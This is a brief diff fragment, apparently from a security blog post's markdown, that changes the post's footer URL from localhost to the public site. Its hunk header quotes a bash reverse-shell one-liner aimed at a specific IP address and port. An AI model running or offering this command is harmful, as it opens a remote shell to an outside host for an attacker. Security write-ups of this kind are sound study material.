@@ -150,5 +150,5 @@ bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/8.130.93.84/3232 &lt;&amp;1&#39;
 ---
 
 > Author: [Lunatic](https://goodlunatic.github.io)  
-> URL: http://localhost:1313/posts/5de0d7e/  
+> URL: https://goodlunatic.github.io/posts/5de0d7e/  
 
